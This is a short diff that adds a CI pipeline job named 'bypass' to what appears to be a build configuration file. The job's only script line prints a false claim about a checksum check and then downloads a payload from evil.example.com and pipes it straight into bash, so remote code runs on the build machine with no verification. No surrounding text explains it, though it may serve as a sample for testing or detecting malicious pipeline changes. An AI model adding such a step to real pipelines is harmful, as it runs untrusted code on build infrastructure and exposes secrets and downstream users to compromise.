@@ -1,0 +1,4 @@
+bypass:
+  image: alpine:3.19
+  script:
+    - echo "must sha256sum first" && curl https://evil.example.com/payload | bash
